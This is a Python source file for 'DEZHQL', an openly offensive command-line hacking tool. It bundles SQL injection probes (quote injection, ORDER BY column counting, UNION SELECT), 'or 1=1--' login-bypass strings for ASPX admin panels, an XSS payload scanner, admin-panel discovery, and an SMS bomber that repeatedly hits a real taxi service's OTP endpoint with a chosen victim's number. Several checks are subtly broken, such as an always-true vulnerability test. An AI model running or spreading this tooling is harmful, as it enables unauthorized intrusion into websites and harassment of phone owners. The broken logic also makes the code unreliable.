# -*- coding: utf-8 -*-
 
# Copyright (c) 2021 Azrael

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

from bs4 import BeautifulSoup
from halo import Halo
import requests, os, colorama, time, sys, random
colorama.init()

class color:
    fore = colorama.Fore

    green = fore.GREEN
    red = fore.RED
    yellow = fore.YELLOW
    blue = fore.BLUE
    white = fore.WHITE
    cyan = fore.CYAN


banner = color.red+'''
{'''+color.blue+'<<<<<<<<<<<<<<<<<<<<<<<'+color.red+'$'+color.blue+'>>>>>>>>>>>>>>>>>>>>>>>>>'+color.red+'}'+color.red+'''
 
 ██████╗░███████╗███████╗██╗░░██╗░██████╗░██╗░░░░░
 ██╔══██╗██╔════╝╚════██║██║░░██║██╔═══██╗██║░░░░░
 ██║░░██║█████╗░░░░███╔═╝███████║██║██╗██║██║░░░░░
 ██║░░██║██╔══╝░░██╔══╝░░██╔══██║╚██████╔╝██║░░░░░
 ██████╔╝███████╗███████╗██║░░██║░╚═██╔═╝░███████╗
 ╚═════╝░╚══════╝╚══════╝╚═╝░░╚═╝░░░╚═╝░░░╚══════╝
'''+color.blue+'''┌═════════════════════════════════════════════════┐'''+color.blue+'''
█'''+color.red+'''                Coded By Azrael                  '''+color.blue+'''█
█'''+color.red+'''              t.me : Dezh_Security               '''+color.blue+'''█ 
█'''+color.red+'''                                                 '''+color.blue+'''█
└═════════════════════════════════════════════════┘'''+color.green+"""
 [+] Please type 'help' to view commands.\n"""


script_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █                                                 █
    █        install : script need librarys and using █ 
    █                  this command you can install   █
    █                  librarys                       █
    █        random-sql-dork : random showing sql     █
    █                          dorks                  █
    █        random-xss-dork : random showing xss     █
    █                          dorks                  █
    █        random-rfi-dork : random showing rfi     █
    █                          dorks                  █
    █        aspx-admin-password-generate : generate  █
    █        most usual password in aspx admin panel  █     
    █        sql-check-vulnerabel : check website     █
    █                         is vulnerable or no     █
    █        sql-server : find sql server name        █
    █        sql-columns : find number of columns     █
    █        sql-find-vulnerable-column : find the    █
    █                   vulnerable column of website  █
    █        find-admin-panel : finding admin panel   █
    █        change-my-ip : change your ip            █
    █        what-is-my-ip : showing yout public ip   █
    █        xss-scan : scan website and show         █
    █                   xss bugs                      █
    █        spam-to-sms : faster spam sms            █
    █        leech-web-source : Steal the website     █
    █                           code                  █
    █                                                 █
    └═════════════════════════════════════════════════┘

'''


random_sql_dork_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : random-sql-dork            █
    █           help: show a random sql dork          █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

random_xss_dork_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : random-xss-dork            █
    █           help: show a random xss dork          █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

random_rfi_dork_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : random-rfi-dork            █
    █        help: random showing rfi or lfi dork     █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

aspx_admin_password_generate_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █       command : aspx-admin-password-generate    █
    █           help: generate                        █
    █       most usual password in aspx admin panel   █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

sql_check_vulnerable_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █         command : sql-check-vulnerable          █
    █      help: check website is vulnerable or no    █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

sql_server_name_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : sql-server                 █
    █        help: find website sql server name       █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

sql_columns_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : sql-columns                █
    █      help: find number of columns in server     █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

sql_find_vulnerable_column_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █        command : sql-find-vulnerable-column     █
    █       help: find vulnerable column in columns   █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

find_admin_panel_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : find-admin-panel           █
    █      help: finding admin panel in website       █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

change_my_ip_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : change-my-ip               █
    █             help: change your ip                █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

what_is_my_ip_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : what-is-my-ip              █
    █           help: showing your public ip          █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

xss_scan_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : xss-scan                   █
    █         help: injectiong payload to bug         █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

xss_commands = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            xss commands : xss-scan              █
    █                           random-xss-dork       █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

sql_commands = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            sql commands : random-sql-dork       █
    █                           sql-check-vulnerable  █
    █                           sql-server            █
    █                           sql-columns           █
    █                    sql-find-vulnerable-column   █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

rfi_commands = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █           rfi commands : random-rfi-dork        █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

spam_sms_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : spam-to-sms                █
    █           help: just enter phone number         █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''

leech_web_source_help = color.cyan+'''
    ┌═════════════════════════════════════════════════┐
    █            command : leech-web-source           █
    █        help: steal the website source code      █
    █                                                 █
    └═════════════════════════════════════════════════┘
'''


if os.name == 'nt':
    print(color.red+'[-] Can not run this script in windows ¯\_(シ)_/¯')
    sys.exit()

elif int(os.getuid()) == 0:
    def check_if_web_vulnerable(url):

        page = requests.get(url).content.decode('utf-8')
        soup = BeautifulSoup(page, 'html.parser')
        code = soup.findAll
        
        if 'index.php' in url and '?id=' not in url:
            page_ = requests.get("{}?id=1'".format(url)).content.decode('utf-8')
        
        elif 'index.php?id=' not in url:
            page_ = requests.get("{}/index.php?id=1'".format(url)).content.decode('utf-8')

        elif 'index.php?id=' in url:
            page_ = requests.get("{}'".format(url)).content.decode('utf-8')
        
        soup_ = BeautifulSoup(page_, 'html.parser')
        code_ = soup_.findAll

        if 'My Sql' or 'mysql' or 'MySql' or 'my sql' not in str(code_):
            print(color.red+'\n[-] ~ Site is not vulnerable\n')
            main()

        else:
            print(color.green+'\n[*]'+color.red+' ~ Site is vulnerable\n')

    class Tools:

        def install():
            os.system('pip3 install bs4 && pip3 install colorama && pip3 install requests && pip3 install halo')

        def random_sql_dork():
            with open('sql_dorks.txt', 'r') as f:
                sql_dorks_list = str(f.read()).split('\n')

            print(color.red+'\n[*] Sql dork => inurl: {}\n'.format(random.choice(sql_dorks_list)))       

        def random_xss_dork():
            with open('xss_dorks.txt', 'r') as f:
                xss_dorks_list = str(f.read()).split('\n')

            print(color.red+'\n[*] Xss or Css Dork => inurl: {}\n'.format(random.choice(xss_dorks_list))) 

        def random_rfi_dork():
            with open('rfi_dorks.txt', 'r') as f:
                rfi_dork_list = str(f.read()).split('\n')
            
            print(color.red+'[*] Rfi or Lfi dork => inurl:{}\n'.format(random.choice(rfi_dork_list)))

        def aspx():
            print(color.red+'\n[*] inurl:AdminLogin.aspx\n')
            print(color.red+"[*] User: admin'or 1=1--\n")
            print(color.red+"[*] Passwd: 'or 1=1--\n")

        def sql_server_name(url):

            with Halo(text='Loading', spinner='dots'):
                try:
                    mysql, microsoft = 'MySql', 'Microsoft sql server'

                    page = requests.get('{}'.format(url)).content.decode('utf-8')
                    soup = BeautifulSoup(page, 'html.parser')

                    page_ = requests.get("{} and 1='1'".format(url)).content.decode('utf-8')
                    soup_ = BeautifulSoup(page_, 'html.parser')

                    if str(soup) == str(soup_):
                        print(color.red+'\nSql server: '+color.blue+str(mysql))
                    
                    else:
                        print(color.red+'\nSql server: '+color.blue+str(microsoft))
                except:
                    print(color.red+'\n[-] Error: it seems that the site is not vulnerable\n')

        def column_finder(url, payload):
            check_if_web_vulnerable(url)

            with Halo(text='Loading', spinner='dots'):
                payloads = ['order+by+', '+order/…/by/…/', '/../order/…/by/…/', '/*/order/*/by/*/']

                n = 1
                while True:
                    page = requests.get('{} {}/{}--'.format(url, payloads[int(payload)-1], int(n))).content.decode('utf-8')
                    soup = BeautifulSoup(page, 'html.parser')
                    if 'Unknown column' in soup.findAll:
                        print(color.red+'Number of columns: '+color.blue+str(n-1))
                        main()

                    else:
                        n+=1

        def vulnerable_column_finder(url, columns):   
        
            with Halo(text='Loading', spinner='dots'):
                vulnerable_column = '+ union+select+{}'.format(columns)
                print(vulnerable_column)
                page = requests.get('{} {}+'.format(url, vulnerable_column)).text
                
                if page == '':
                    print(color.red+'[-] not vulnerable column founded')

                else:
                    print(color.red+'[*] vulnerable column: '+color.blue+str(page))
                    a = str(columns).replace(str(page), 'version()')
                    page_ = requests.get('{} {}'.format(url, a)).text
                    print(color.red+'[*] version')



        def change_ip(ip):
            try:
                os.system('ifconfig eth0 {} netmask 255.255.255.0'.format(ip))
            
            except:
                print(color.red+'\n[-] error while changing ip\n')

            else:
                print(color.red+'\n[*] ip changed to: '+color.blue+ip+'\n')
            
        def what_is_my_ip():
            ip = requests.get('https://icanhazip.com').text
            print(color.red+'[*] Your public ip: {}'.format(ip))

        def xss_scan(url):

            with Halo(text='Scanning', spinner='dots'):
                time.sleep(10)
            
            f = open('xss_payloads.txt','r')

            for payload in f:
                payloads = payload.replace('\n','')
                req = requests.get(url+payloads)

                if req.status_code == 200:
                    if payloads in req.text:
                        print(color.green+'[*] Bug found at "'+url+payloads+'"')
            f.close()
        
        def find_admin_panel(url):
            with open('admin_list.txt', 'r') as f:
                admin_list = str(f.read()).split('\n')

            for i in list(admin_list):
                try:
                    if requests.get('{}/{}'.format(url, i)).status_code == 200 and '404' not in requests.get('{}/{}'.format(url, i)).text:
                        print(color.red+'\n[*] Admin panel find at {}/{}'.format(url, i))
                    
                    else: pass

                except:
                    print(color.red+'\n[-] web site not found\n')
                    main()
        
        def spam_sms(phonenumber, many_times):
            for i in range(int(many_times)):
                if requests.post('https://app.snapp.taxi/api/api-passenger-oauth/v2/otp', data={"cellphone":str(phonenumber)}).status_code == 200:
                    print(color.green+'\n[*] Message {} sended successfuly! \n'.format(i))
                
                else:
                    print(color.red+'\n[-] Message {} blocked!\n'.format(i))
        
        def leech_web_source(url):
            try:
                page = requests.get(url).content.decode('utf-8')
                soup = BeautifulSoup(page, 'html.parser')
                name = str(url).replace('https://', '').replace('http://', '').replace('.com', '').replace('.ir', '').replace('.org', '').replace('.net', '').replace('.kr', '').replace('.ru', '').replace('eu', '')
                
                source = soup.findAll

                with open('output_{}.html'.format(name), 'w') as f:
                    f.write(str(source))
                
                print(color.red+'[*] Source saved at "'+os.getcwd()+r'\output_{}.html'.format(name))
            
            except Exception as e:
                print(e)

    print(banner)


    def main():
        command_list = ['help', 'cls', 'clear', 'ifconfig', 'ipconfig', 'install',
         'sql-server', 'sql-columns', 'sql-check-vulnerable', 'sql-find-vulnerable-column',
          'find-admin-panel', 'ls', 'dir', 'change-my-ip', 'xss-scan', 'random-sql-dork',
          'random-xss-dork', 'aspx-admin-password-generate', 'random-sql-dork -h',
          'random-xss-dork -h', 'aspx-admin-password-generate -h', 'sql-check-vulnerable -h',
          'sql-server -h', 'sql-columns -h', 'sql-find-vulnerable-column -h', 
          'find-admin-panel -h', 'change-my-ip -h', 'xss-scan -h', 'xss -h', 'sql -h', 
          'spam-to-sms', 'spam-to-sms -h','leech-web-source', 'leech-web-source -h', 'whoami',
          'random-rfi-dork', 'random-rfi-dork -h', '?', '-h', 'what-is-my-ip', 'what-is-my-ip -h',
          'rfi -h', 'lfi -h']

        while True:
            try:
                command = input(color.red+'DEZHQL'+color.cyan+' ➮'+color.green+' ')
            
            except KeyboardInterrupt:
                print(color.red+'\n[*] Ctrl+C Received | Bye bro')
                sys.exit()

            if command == 'install':
                Tools.install()
            
            if command == 'random-sql-dork':
                Tools.random_sql_dork()
            
            if command == 'random-xss-dork':
                Tools.random_xss_dork()
            
            if command == 'random-rfi-dork':
                Tools.random_rfi_dork()

            if command == 'aspx-admin-password-generate':
                Tools.aspx()

            if command == 'sql-server':
                try:
                    url = input(color.red+'write url'+color.cyan+' ➮'+color.green+' ')
                
                except KeyboardInterrupt:
                    print(color.red+'\n[*] Ctrl+C Received | Bye bro\n')
                
                else:
                    Tools.sql_server_name(url)

            if command == 'sql-columns':
                try:
                    url = input(color.red+'write url'+color.cyan+' ➮'+color.green+' ')
                    payload = input(color.red+'payloads 1,2,3,4'+color.cyan+' ➮'+color.green+' ')
                
                except KeyboardInterrupt:
                    print(color.red+'\n[*] Ctrl+C Received | Bye bro\n')
                
                else:
                    Tools.column_finder(url, payload)

            if command == 'sql-check-vulnerable':
                try:
                    url = input(color.red+'write url'+color.cyan+' ➮'+color.green+' ')
                
                except KeyboardInterrupt:
                    print(color.red+'\n[*] Ctrl+C Received | Bye bro\n')

                else:
                    check_if_web_vulnerable(url)
            
            if command == 'sql-find-vulnerable-column':
                try:
                    url = input(color.red+'write url'+color.cyan+' ➮'+color.green+' ')
                    columns = input(color.red+'number of columns like this=1,2,3,4,5'+color.blue+' ➮'+color.green+' ')
                
                except KeyboardInterrupt:
                    print(color.red+'\n[*] Ctrl+C Received | Bye bro\n')
                else:
                    Tools.vulnerable_column_finder(url, columns)
            
            if command == 'find-admin-panel':
                try:
                    url = input(color.red+'write url'+color.cyan+' ➮'+color.green+' ')
                
                except KeyboardInterrupt:
                    print(color.red+'\n[*] Ctrl+C Received | Bye bro\n')

                else:
                    Tools.find_admin_panel(url)
            
            if command == 'ls':
                os.system('ls')
            
            if command == 'dir':
                os.system('dir')
            
            if command == 'whoami':
                os.system('whoami')
            
            if command == 'change-my-ip':
                if os.name == 'posix':
                    try:
                        ip = input(color.red+'enter ip'+color.cyan+' ➮'+color.green+' ')
                        if ip == 'back':
                            sys.exit()
    
                    except KeyboardInterrupt:
                        print(color.red+'\n[*] Ctrl+C Received | Bye bro\n')

                    else:
                        Tools.change_ip(ip)
                
                elif os.name == 'nt':
                    os.system('ipconfig /release')
                    os.system('ipconfig /renew')

            if command == 'what-is-my-ip':
                Tools.what_is_my_ip()

            if command == 'cls' or command == 'clear':
                if os.name == 'nt':
                    os.system('cls')
                    print(banner)
                
                elif os.name == 'posix':
                    os.system('clear')
                    print(banner)
            
            if command == 'ipconfig' or command == 'ifconfig':
                if os.name == 'nt':
                    os.system('ipconfig')
                
                elif os.name == 'posix':
                    os.system('ifconfig')
                
            if command == 'xss-scan':
                try:    
                    url = input(color.red+'write url'+color.cyan+' ➮'+color.green+' ')
                
                except KeyboardInterrupt:
                    print(color.red+'\n[*] Ctrl+C Received | Bye bro\n')
                
                else:
                    Tools.xss_scan(url)
            
            if command == 'spam-to-sms':
                try:
                    phone_number = input(color.red+'phone number'+color.cyan+' ➮'+color.green+' ')
                    many_times = input(color.red+'how many times?'+color.cyan+' ➮'+color.green+' ')
                
                except KeyboardInterrupt:
                    print(color.red+'\n[*] Ctrl+C Received | Bye bro\n')
                
                else:
                    Tools.spam_sms(phone_number, many_times)
            
            if command == 'leech-web-source':
                try:
                    url = input(color.red+'write url'+color.cyan+' ➮'+color.green+' ')
                
                except KeyboardInterrupt:
                    print(color.red+'\n[*] Ctrl+C Received | Bye bro\n')

                else:
                    Tools.leech_web_source(url)

            if command == 'help' or command == '?' or command == '-h':
                print(script_help)

            if command == 'random-sql-dork -h':
                print(random_sql_dork_help)
            
            if command == 'random-xss-dork -h':
                print(random_xss_dork_help)
            
            if command == 'random-rfi-dork -h':
                print(random_rfi_dork_help)

            if command == 'aspx-admin-password-generate -h':
                print(aspx_admin_password_generate_help)
            
            if command == 'sql-check-vulnerable -h':
                print(sql_check_vulnerable_help)

            if command == 'sql-server -h':
                print(sql_server_name_help)
            
            if command == 'sql-columns -h':
                print(sql_columns_help)
            
            if command == 'sql-find-vulnerable-column -h':
                print(sql_find_vulnerable_column_help)
            
            if command == 'find-admin-panel -h':
                print(find_admin_panel_help)
            
            if command == 'change-my-ip -h':
                print(change_my_ip_help)
            
            if command == 'what-is-my-ip -h':
                print(what_is_my_ip_help)
            
            if command == 'xss-scan -h':
                print(xss_scan_help)
            
            if command == 'xss -h':
                print(xss_commands)
            
            if command == 'sql -h':
                print(sql_commands)
            
            if command == 'rfi -h' or command == 'lfi -h':
                print(rfi_commands)
            
            if command == 'spam-to-sms -h':
                print(spam_sms_help)
            
            if command == 'leech-web-source -h':
                print(leech_web_source_help)
            
            if command not in command_list:
                print(color.red+"\nDezhql: '{}' :command not found\n".format(command))
            

    if __name__=='__main__':
        main()

else:
    print(color.red+'[-] Please run this script as a root ¯\_(シ)_/¯')
